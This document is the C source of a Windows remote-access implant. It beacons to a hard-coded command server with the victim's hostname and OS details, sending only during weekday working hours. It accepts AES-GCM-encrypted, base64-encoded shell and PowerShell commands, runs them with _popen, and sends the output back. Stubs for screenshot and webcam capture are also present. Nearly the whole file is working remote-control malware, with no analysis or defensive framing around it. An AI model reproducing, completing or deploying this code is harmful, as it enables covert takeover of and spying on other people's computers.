#include "client.h"

void log_it(const char* message) {
    if (LOGGING && log_file) {
        time_t now;
        time(&now);
        char* timestamp = ctime(&now);
        timestamp[strlen(timestamp) - 1] = '\0'; // Remove newline
        fprintf(log_file, "[%s] %s\n", timestamp, message);
        fflush(log_file);
    }
}

char* get_session_id(const char* ip_address) {
    char* session_id = malloc(65); // SHA256 is 64 chars + null terminator
    if (!session_id) {
        return NULL;
    }

    unsigned char hash[SHA256_DIGEST_LENGTH];
    char data[256];
    int sum = 0;
    char* ip_copy = _strdup(ip_address);
    char* ip_parts = strtok(ip_copy, ".");
    while (ip_parts != NULL) {
        sum += atoi(ip_parts);
        ip_parts = strtok(NULL, ".");
    }
    free(ip_copy);

    snprintf(data, sizeof(data), "%s<>%d", ip_address, sum);
    SHA256((unsigned char*)data, strlen(data), hash);

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(&session_id[i*2], "%02x", hash[i]);
    }
    session_id[64] = '\0';

    return session_id;
}

// Function to encode base64
char* base64_encode(const unsigned char *data, size_t length) {
    BIO *bio, *b64;
    BUF_MEM *buffer_ptr;
    char *buffer;

    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); // Do not include newlines in base64 encoded output
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);
    BIO_write(bio, data, length);
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &buffer_ptr);

    buffer = (char *)malloc(buffer_ptr->length + 1); // Allocate enough space for null-terminator
    memcpy(buffer, buffer_ptr->data, buffer_ptr->length);
    buffer[buffer_ptr->length] = '\0';  // Null-terminate

    BIO_free_all(bio);
    return buffer;
}


// Function to decode base64
unsigned char* base64_decode(const char *data, size_t *length) {
    BIO *bio, *b64;
    size_t len = strlen(data);
    unsigned char *buffer;

    // Allocate buffer to hold the decoded data. Estimate the size based on input length.
    // Base64 encoded data is approximately 4/3 of the original size.
    buffer = (unsigned char *)malloc(len * 3 / 4 + 1); 

    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); // Do not expect newlines in base64 encoded input
    bio = BIO_new_mem_buf(data, len);
    bio = BIO_push(b64, bio);
    
    *length = BIO_read(bio, buffer, len);
    buffer[*length] = '\0'; // Null-terminate the decoded output

    BIO_free_all(bio);
    return buffer;
}

// Function to derive key using PBKDF2
void derive_key(const unsigned char *shared_key, unsigned char *salt, unsigned char *key) {
    PKCS5_PBKDF2_HMAC((const char *)shared_key, strlen((const char *)shared_key), salt, SALT_LENGTH, 200000, EVP_sha512(), KEY_LENGTH, key);
}

// Encryption function
char* encrypt_data(const char *data, const char *shared_key) {
    unsigned char salt[SALT_LENGTH], iv[IV_LENGTH], key[KEY_LENGTH];
    unsigned char auth_tag[TAG_LENGTH], encrypted_data[1024];
    int len, encrypted_data_len;
    EVP_CIPHER_CTX *ctx;

    // Generate random salt and IV
    RAND_bytes(salt, SALT_LENGTH);
    RAND_bytes(iv, IV_LENGTH);

    // Derive key
    derive_key((unsigned char *)shared_key, salt, key);

    // Initialize encryption context
    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_LENGTH, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);

    // Encrypt the data
    EVP_EncryptUpdate(ctx, encrypted_data, &len, (unsigned char *)data, strlen(data));
    encrypted_data_len = len;
    EVP_EncryptFinal_ex(ctx, encrypted_data + len, &len);
    encrypted_data_len += len;

    // Get the authentication tag
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LENGTH, auth_tag);

    EVP_CIPHER_CTX_free(ctx);

    // Encode to base64
    char *salt_b64 = base64_encode(salt, SALT_LENGTH);
    char *iv_b64 = base64_encode(iv, IV_LENGTH);
    char *auth_tag_b64 = base64_encode(auth_tag, TAG_LENGTH);
    char *encrypted_data_b64 = base64_encode(encrypted_data, encrypted_data_len);

    // Prepare the result string
    char *result = (char *)malloc(strlen(salt_b64) + strlen(iv_b64) + strlen(auth_tag_b64) + strlen(encrypted_data_b64) + 4);
    sprintf(result, "%s:%s:%s:%s", salt_b64, iv_b64, auth_tag_b64, encrypted_data_b64);

    free(salt_b64);
    free(iv_b64);
    free(auth_tag_b64);
    free(encrypted_data_b64);

    return result;
}

// Decryption function
char* decrypt_data(const char *encrypted, const char *shared_key) {
    unsigned char salt[SALT_LENGTH], iv[IV_LENGTH], auth_tag[TAG_LENGTH];
    unsigned char encrypted_data[1024];
    unsigned char key[KEY_LENGTH];
    int encrypted_data_len, decrypted_len;
    EVP_CIPHER_CTX *ctx;
    size_t len;
    int out_len;

    // Make a copy of the input string to avoid modifying the original
    char *encrypted_copy = strdup(encrypted);
    if (!encrypted_copy) {
        return NULL; // Memory allocation failure
    }

    // Split the encrypted string
    char *parts[4];
    char *token = strtok(encrypted_copy, ":");
    for (int i = 0; i < 4; i++) {
        if (token) {
            parts[i] = token;
            token = strtok(NULL, ":");
        } else {
            free(encrypted_copy); // Clean up
            return NULL; // Invalid input
        }
    }

    // Decode from base64
    unsigned char *salt_b64 = base64_decode(parts[0], &len);
    if (len != SALT_LENGTH) {
        free(salt_b64);
        return NULL; // Decoding failed or incorrect length
    }
    memcpy(salt, salt_b64, SALT_LENGTH);
    free(salt_b64);

    unsigned char *iv_b64 = base64_decode(parts[1], &len);
    if (len != IV_LENGTH) {
        free(iv_b64);
        return NULL; // Decoding failed or incorrect length
    }
    memcpy(iv, iv_b64, IV_LENGTH);
    free(iv_b64);

    unsigned char *auth_tag_b64 = base64_decode(parts[2], &len);
    if (len != TAG_LENGTH) {
        free(auth_tag_b64);
        return NULL; // Decoding failed or incorrect length
    }
    memcpy(auth_tag, auth_tag_b64, TAG_LENGTH);
    free(auth_tag_b64);

    unsigned char *encrypted_data_b64 = base64_decode(parts[3], &len);
    encrypted_data_len = len;
    memcpy(encrypted_data, encrypted_data_b64, encrypted_data_len);
    free(encrypted_data_b64);

    // Derive key
    derive_key((unsigned char *)shared_key, salt, key);

    // Initialize decryption context
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        return NULL; // Memory allocation failure
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Initialization failed
    }

    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Initialization failed
    }

    // Decrypt the data
    if (1 != EVP_DecryptUpdate(ctx, encrypted_data, &decrypted_len, encrypted_data, encrypted_data_len)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Decryption failed
    }

    // Set the expected tag value
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LENGTH, auth_tag)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Setting tag failed
    }

    if (1 != EVP_DecryptFinal_ex(ctx, encrypted_data + decrypted_len, &out_len)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Decryption failed
    }

    decrypted_len += out_len;

    EVP_CIPHER_CTX_free(ctx);

    // Null-terminate the decrypted data
    encrypted_data[decrypted_len] = '\0';
    return (char *)strdup((const char *)encrypted_data);
}

void send_command(const char* response) {
    char* encrypted = encrypt_data(response, SESSION_ID);
    if (encrypted == NULL) {
        log_it("Encryption failed");
        return;
    }

    size_t encrypted_len = strlen(encrypted);

    if (encrypted_len >= CHUNK_SIZE) {
        while (encrypted_len > 0) {
            size_t chunk_size = (encrypted_len > CHUNK_SIZE) ? CHUNK_SIZE : encrypted_len;
            char chunk[CHUNK_SIZE + 7]; // Additional space for '--FIN--' and null terminator

            // Copy the chunk of data from encrypted
            memcpy(chunk, encrypted, chunk_size);
            encrypted += chunk_size;
            encrypted_len -= chunk_size;

            if (encrypted_len == 0) {
                // Add termination marker for the last chunk
                strcat(chunk, "--FIN--");
                chunk_size += 7; // Increase chunk size to account for the '--FIN--' marker
            }

            // Send chunk to the socket
            int result = send(client_socket, chunk, chunk_size, 0);
            if (result == SOCKET_ERROR) {
                int error_code = WSAGetLastError();
                fprintf(stderr, "Send failed with error: %d\n", error_code);
                free(encrypted);
                return;
            }

            // Log the sent chunk
            char log_message[CHUNK_SIZE + 30]; // Adjust size as needed for logging
            snprintf(log_message, sizeof(log_message), "Sent Chunk: %.*s", (int)chunk_size, chunk);
            log_it(log_message);
        }
    } else {
        // If the encrypted data fits in one chunk
        int result = send(client_socket, encrypted, encrypted_len, 0);
        if (result == SOCKET_ERROR) {
            int error_code = WSAGetLastError();
            fprintf(stderr, "Send failed with error: %d\n", error_code);
            free(encrypted);
            return;
        }

        // Log the sent data
        char log_message[CHUNK_SIZE + 30]; // Adjust size as needed for logging
        snprintf(log_message, sizeof(log_message), "Sent Data: %s", encrypted);
        log_it(log_message);
    }

    free(encrypted);
}

void send_beacon() {
    SYSTEM_INFO sysInfo;
    OSVERSIONINFOEX osInfo;
    char hostname[256];
    DWORD size = sizeof(hostname);

    // Get system information
    GetSystemInfo(&sysInfo);
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO)&osInfo);
    GetComputerNameA(hostname, &size);

    // Prepare the beacon message
    char buffer[CHUNK_SIZE];
    const char* beacon_format = "{\"response\": {\"beacon\": true,\"version\": \"%s\",\"type\": \"%s\",\"platform\": \"Windows\",\"arch\": \"%s\",\"osver\": \"%lu.%lu.%lu\",\"hostname\": \"%s\"}}";

    // Format the beacon message into the buffer
    int formatted_length = _snprintf_s(buffer, sizeof(buffer), _TRUNCATE,
                                        beacon_format,
                                        CVER, 
                                        TYPE, 
                                        sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86",
                                        osInfo.dwMajorVersion, 
                                        osInfo.dwMinorVersion, 
                                        osInfo.dwBuildNumber,
                                        hostname);

    if (formatted_length < 0) {
        // Handle formatting error
        fprintf(stderr, "Formatting error occurred in send_beacon.\n");
        return;
    }

    // Send the command with the formatted beacon message
    send_command(buffer);
}

void sleep_ms(int milliseconds) {
    Sleep(milliseconds);
}

// Function to get a retry interval
int get_retry_interval(int retries) {
    size_t num_intervals = sizeof(RETRY_INTERVALS) / sizeof(RETRY_INTERVALS[0]);
    if ((size_t)retries < num_intervals) {
        return RETRY_INTERVALS[retries];
    }
    return RETRY_INTERVALS[num_intervals - 1];
}

// Function to convert UTF-8 to UTF-16
WCHAR* utf8_to_utf16(const char* str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    WCHAR* result = malloc(len * sizeof(WCHAR));
    if (!result) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, str, -1, result, len);
    return result;
}

// Function to simulate setInterval for beacon
DWORD WINAPI beacon_interval_thread(LPVOID lpParam) {
    (void)lpParam;
    while (!exit_process) {
        sleep_ms(BEACON_MIN_INTERVAL + (rand() % (BEACON_MAX_INTERVAL - BEACON_MIN_INTERVAL + 1)));
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        
        // Check if it's Monday through Friday (1-5) and between 7 AM and 7 PM
        if (st.wDayOfWeek >= 1 && st.wDayOfWeek <= 5 && 
            st.wHour >= 7 && st.wHour <= 19) {
            send_beacon();
        }
    }
    return 0;
}

// Function to start beacon interval thread
void start_beacon_interval() {
    CreateThread(NULL, 0, beacon_interval_thread, NULL, 0, NULL);
}

// Function to handle screenshot (placeholder)
void run_screenshot() {
    // This would require platform-specific libraries
    send_command("{\"response\": {\"error\": \"Screenshot functionality not implemented\"}}");
}

// Function to handle webcam (placeholder)
void run_webcam_clip() {
    // This would require platform-specific libraries
    send_command("{\"response\": {\"error\": \"Webcam functionality not implemented\"}}");
}

// Function to parse and execute action
void parse_action(const char* action) {
    char* action_copy = _strdup(action);
    char* command = strtok(action_copy, " ");

    if (command == NULL) {
        send_command("{\"response\": {\"error\": \"No command provided\"}}");
        free(action_copy);
        return;
    }

    if (strcmp(command, "up") == 0) {
        get_uptime();
    } else if (strcmp(command, "di") == 0) {
        exit_process = 1;
        send_command("{\"response\": {\"data\": \"Disconnecting...\"}}");
    } else if (strcmp(command, "cmd") == 0 || strcmp(command, "ps") == 0) {
        char* payload = strtok(NULL, "");
        if (payload) {
            int decoded_len = EVP_DecodeBlock(NULL, (const unsigned char*)payload, strlen(payload));
            char* decoded_payload = malloc(decoded_len + 1);
            if (decoded_payload) {
                EVP_DecodeBlock((unsigned char*)decoded_payload, (const unsigned char*)payload, strlen(payload));
                decoded_payload[decoded_len] = '\0';  // Null-terminate the string
                char* result = run_command(decoded_payload);
                char* response = malloc(strlen(result) + 64);  // 64 for the JSON wrapper
                if (response) {
                    snprintf(response, strlen(result) + 64, "{\"response\": {\"data\": \"%s\"}}", result);
                    send_command(response);
                    free(response);
                } else {
                    send_command("{\"response\": {\"error\": \"Memory allocation failed\"}}");
                }
                free(result);
                free(decoded_payload);
            } else {
                send_command("{\"response\": {\"error\": \"Memory allocation failed\"}}");
            }
        } else {
            send_command("{\"response\": {\"error\": \"No payload provided\"}}");
        }
    } else if (strcmp(command, "ss") == 0) {
        run_screenshot();
    } else if (strcmp(command, "wc") == 0) {
        run_webcam_clip();
    } else {
        char error_msg[100];
        snprintf(error_msg, sizeof(error_msg), "{\"response\": {\"error\": \"Unsupported command: %s\"}}", command);
        send_command(error_msg);
    }

    free(action_copy);
}

// Function to format file name
char* format_file_name(const char* name, const char* extension) {
    time_t now;
    struct tm tm_info;
    char timestamp[20];
    char* file_name = malloc(100);  // Adjust size as needed

    if (!file_name) return NULL;

    time(&now);
    localtime_s(&tm_info, &now);
    strftime(timestamp, 20, "%Y-%m-%d_%H-%M-%S", &tm_info);

    snprintf(file_name, 100, "%s_%s.%s", name, timestamp, extension);
    return file_name;
}

// Function to format time
char* format_time(long milliseconds) {
    long total_seconds = milliseconds / 1000;
    int days = (int)(total_seconds / 86400);
    int hours = (int)((total_seconds % 86400) / 3600);
    int minutes = (int)((total_seconds % 3600) / 60);
    int seconds = (int)(total_seconds % 60);

    char* formatted_time = malloc(50);  // Adjust size as needed
    if (!formatted_time) return NULL;

    snprintf(formatted_time, 50, "%dd %dh %dm %ds", days, hours, minutes, seconds);
    return formatted_time;
}

// Function to get uptime
void get_uptime() {
    time_t current_time;
    time(&current_time);
    long uptime_millis = (long)(difftime(current_time, start_time) * 1000);
    char* uptime = format_time(uptime_millis);
    
    if (uptime) {
        char response[256];
        snprintf(response, sizeof(response), "{\"response\": {\"data\": \"%s\"}}", uptime);
        send_command(response);
        free(uptime);
    } else {
        send_command("{\"response\": {\"error\": \"Failed to get uptime\"}}");
    }
}

// Function to run a command
char* run_command(const char* command) {
    char* output = NULL;
    size_t output_size = 0;
    char buffer[128];
    FILE* pipe = _popen(command, "r");

    if (!pipe) {
        return _strdup("Failed to run command");
    }

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        size_t len = strlen(buffer);
        char* new_output = realloc(output, output_size + len + 1);
        if (!new_output) {
            free(output);
            _pclose(pipe);
            return _strdup("Memory allocation failed");
        }
        output = new_output;
        strcpy_s(output + output_size, len + 1, buffer);
        output_size += len;
    }

    _pclose(pipe);
    return output ? output : _strdup("");
}

// Function to handle connection and communication
void handle_connection() {
    char buffer[1024] = {0};
    while (!exit_process) {
        int valread = recv(client_socket, buffer, 1024, 0);
        if (valread > 0) {
            char* decrypted = decrypt_data(buffer, SESSION_ID);
            if (decrypted) {
                parse_action(decrypted);
                free(decrypted);
            }
            ZeroMemory(buffer, 1024);
        } else if (valread == 0) {
            log_it("Server disconnected");
            break;
        } else {
            log_it("Read error");
            break;
        }
    }
}

int connect_to_server() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        log_it("WSAStartup failed");
        return -1;
    }

    struct addrinfo *result = NULL, *ptr = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    char port_str[6];
    snprintf(port_str, sizeof(port_str), "%d", SERVER_PORT);

    if (getaddrinfo(SERVER_ADDRESS, port_str, &hints, &result) != 0) {
        log_it("getaddrinfo failed");
        WSACleanup();
        return -1;
    }

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        client_socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (client_socket == INVALID_SOCKET) {
            log_it("Socket creation failed");
            freeaddrinfo(result);
            WSACleanup();
            return -1;
        }

        if (connect(client_socket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            closesocket(client_socket);
            client_socket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (client_socket == INVALID_SOCKET) {
        log_it("Unable to connect to server");
        WSACleanup();
        return -1;
    }

    log_it("Connected to server");
    SESSION_ID = get_session_id(SERVER_ADDRESS);
    send_beacon();

    return 0;
}

int main() {
    log_file = fopen("client.log", "a");
    if (!log_file) {
        fprintf(stderr, "Failed to open log file\n");
        return 1;
    }

    time(&start_time);
    
    while (!exit_process) {
        if (connect_to_server() < 0) {
            log_it("Failed to connect to server");
            sleep_ms(get_retry_interval(0));
        } else {
            start_beacon_interval();
            handle_connection();
        }
    }

    if (client_socket != INVALID_SOCKET) {
        closesocket(client_socket);
    }
    WSACleanup();
    fclose(log_file);
    return 0;
}